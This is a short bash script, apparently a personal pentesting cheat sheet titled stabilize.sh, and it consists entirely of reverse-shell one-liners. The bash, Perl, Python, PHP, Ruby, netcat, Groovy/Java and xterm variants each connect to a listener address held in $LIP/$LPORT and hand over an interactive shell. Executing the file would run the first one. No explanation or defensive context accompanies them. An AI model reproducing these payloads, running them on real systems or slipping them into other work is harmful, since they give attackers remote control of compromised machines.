#!/bin/bash - 
#===============================================================================
#
#          FILE: stabilize.sh
# 
#         USAGE: ./stabilize.sh 
# 
#   DESCRIPTION: 
# 
#       OPTIONS: ---
#  REQUIREMENTS: ---
#          BUGS: ---
#         NOTES: ---
#        AUTHOR: Amit Agarwal (aka), 
#  ORGANIZATION: Individual
#       CREATED: 01/01/2021 13:13
#      REVISION:  ---
#===============================================================================

set -o nounset                              # Treat unset variables as an error

## Bash
bash -i >& /dev/tcp/$LIP/$LPORT 0>&1
# OR
bash -c "bash -i >& /dev/tcp/$LIP/$LPORT 0>&1"

## Perl
perl -e 'use Socket;$i="$LIP";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

## Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LIP",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

## PHP
php -r '\$sock=fsockopen("$LIP",$LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

## Ruby
ruby -rsocket -e'f=TCPSocket.open("$LIP",$LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

## netcat
nc -e /bin/sh $LIP $LPORT

## nc - my fav
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LIP $LPORT >/tmp/f

## Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$LIP/$LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

## xterm
xterm -display $LIP:1
Xnest :1
xhost +$PT_IP
